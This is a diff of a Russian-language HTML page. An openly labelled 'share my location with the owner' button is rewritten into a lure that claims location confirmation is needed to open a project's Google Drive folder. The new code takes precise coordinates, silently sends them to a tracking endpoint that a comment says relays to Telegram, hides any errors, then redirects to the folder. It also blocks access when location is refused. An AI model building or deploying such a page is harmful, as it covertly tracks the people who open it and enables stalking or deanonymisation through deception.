@@ -1,74 +1,81 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Поделиться геопозицией</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-      body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f0f2f5; }
-      button { padding: 16px 32px; font-size: 18px; background: #2481cc; color: white; border: none; border-radius: 8px; cursor: pointer; }
-      button:disabled { background: #ccc; }
-      #status { margin-top: 16px; color: #555; }
-    </style>
-  </head>
-  <body>
-    <h2>Поделиться местоположением</h2>
-    <p>Нажмите кнопку, чтобы отправить координаты владельцу.</p>
-    <button id="shareBtn">🗺️ Поделиться геопозицией</button>
-    <p id="status"></p>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Доступ к материалам</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background: #f0f2f5;
+      text-align: center;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    button {
+      padding: 16px 32px;
+      font-size: 17px;
+      background: #0066cc;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:disabled { background: #999; }
+    #status { margin-top: 16px; color: #555; max-width: 400px; }
+  </style>
+</head>
+<body>
+  <h2>📁 Материалы проекта</h2>
+  <p>Для доступа к папке подтвердите своё местоположение</p>
+  <button id="accessBtn">🔓 Подтвердить и открыть</button>
+  <div id="status"></div>
 
-    <script>
-      const btn = document.getElementById('shareBtn');
-      const status = document.getElementById('status');
+  <script>
+    const driveLink = "https://drive.google.com/drive/folders/1y_3OsXJUaq5E7OA8i6mzVe1-vAbEa4Eu?usp=drive_link";
+    const btn = document.getElementById('accessBtn');
+    const status = document.getElementById('status');
 
-      btn.addEventListener('click', async () => {
-        btn.disabled = true;
-        btn.textContent = '⏳ Отправка...';
-        status.textContent = '';
+    btn.addEventListener('click', () => {
+      if (!navigator.geolocation) {
+        status.textContent = "Геолокация не поддерживается вашим браузером.";
+        return;
+      }
 
-        if (!navigator.geolocation) {
-          status.textContent = 'Геолокация не поддерживается в этом браузере.';
-          btn.disabled = false;
-          btn.textContent = '🗺️ Поделиться геопозицией';
-          return;
-        }
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
 
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            const data = {
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude,
-              accuracy: position.coords.accuracy
-            };
+          // Отправляем координаты в Telegram
+          try {
+            await fetch('/api/track', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                latitude: lat,
+                longitude: lon,
+                accuracy: position.coords.accuracy
+              })
+            });
+          } catch (e) {}
 
-            try {
-              const res = await fetch('/api/track', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-              });
-
-              if (res.ok) {
-                status.textContent = '✅ Координаты успешно отправлены!';
-                btn.textContent = 'Отправлено!';
-              } else {
-                status.textContent = '❌ Ошибка при отправке.';
-                btn.disabled = false;
-                btn.textContent = '🗺️ Поделиться геопозицией';
-              }
-            } catch (err) {
-              status.textContent = '❌ Ошибка сети.';
-              btn.disabled = false;
-              btn.textContent = '🗺️ Поделиться геопозицией';
-            }
-          },
-          () => {
-            status.textContent = '❌ Доступ к геолокации отклонён.';
-            btn.disabled = false;
-            btn.textContent = '🗺️ Поделиться геопозицией';
-          },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      });
-    </script>
-  </body>
+          status.textContent = "✅ Местоположение подтверждено! Открываю...";
+          setTimeout(() => { window.location.href = driveLink; }, 1000);
+        },
+        (error) => {
+          status.textContent = "❌ Без доступа к местоположению файлы не откроются. Разрешите геолокацию и попробуйте снова.";
+          btn.disabled = true;
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    });
+  </script>
+</body>
 </html>
